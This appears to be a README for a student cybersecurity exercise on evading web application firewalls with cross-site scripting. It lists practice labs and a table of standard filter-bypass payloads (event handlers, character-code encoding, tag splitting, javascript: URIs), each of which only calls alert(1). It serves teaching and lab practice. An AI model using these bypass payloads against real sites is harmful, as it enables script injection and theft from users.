
# 🔐 μLearn Cybersecurity Task 8: WAF Evasion for XSS

## 📌 Task Description

This is the submission for **Task 8: WAF Evasion for XSS** under the **μLearn Cybersecurity Learning Circle**.  
The goal is to explore how **Web Application Firewalls (WAFs)** filter XSS attacks and create a **Python script** that generates **bypass payloads** to evade such filters.

🎯 **Karma Points:** ⭐️⭐️⭐️ 800  
🏷️ **Tag to Submit on Discord:** `#cl-cybersec-pysxss`

---

## 🎯 Objectives

- Understand how WAFs block Cross-Site Scripting (XSS) payloads
- Write a Python script that generates multiple XSS payloads using evasion techniques
- Test those payloads on hosted vulnerable web apps
- Document and demonstrate successful WAF evasion attempts

---

## 💻 Python Script: `payload.py`

This script generates XSS payloads that attempt to evade WAFs using methods like:
- Tag breaking (`<scr<script>ipt>`)
- Null byte injection (`<scr\0ipt>`)
- SVG or IMG tags with JavaScript event handlers (`onload`, `onerror`)
- CharCode encoding (`String.fromCharCode()`)

> ✅ **Run it:**
```bash
python3 payload.py
````

---

## 🧪 Online Testing Platforms Used

| Platform               | URL                                                               | Notes                                     |
| ---------------------- | ----------------------------------------------------------------- | ----------------------------------------- |
| **PortSwigger Labs**   | [Link](https://portswigger.net/web-security/cross-site-scripting) | Modern labs with simulated WAF            |
| **bWAPP (Online)**     | [http://www.itsecgames.com](http://www.itsecgames.com)            | Vulnerable app with multiple input fields |
| **XSS Game by Google** | [https://xss-game.appspot.com](https://xss-game.appspot.com)      | Fun and educational                       |

---

## ✅ Example Payloads Generated

| Payload                                                                   | Technique            |
| ------------------------------------------------------------------------- | -------------------- |
| `<svg/onload=alert(1)>`                                                   | SVG event handler    |
| `<img src=x onerror=alert(1)>`                                            | IMG event            |
| `<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>` | CharCode encoding    |
| `<scr<script>ipt>alert(1)</scr</script>ipt>`                              | Tag splitting        |
| `<iframe src='javascript:alert(1)'></iframe>`                             | JavaScript URI       |
| `&lt;script&gt;alert(1)&lt;/script&gt;`                                   | HTML entity encoding |

---

## 📸 Screenshots

> *(Include screenshots inside a `/screenshots/` folder in your repo)*
> Examples:

* Script output with payloads
* Alert popup in browser
* Console/network proof (optional)

---

## 📘 Learning Outcome

* WAFs often block predictable or signature-based payloads
* Obfuscation techniques can bypass many naïve or character-based filters
* Testing on real-world labs helps verify the effectiveness of your payloads

---

## 📁 Folder Structure

```bash
.
├── payload.py              # Python script to generate payloads
├── README.md               # This documentation
└── screenshots/            # (Optional) Screenshots showing successful XSS
```

---

## 🛡️ License

MIT License – For educational and research purposes only.

```

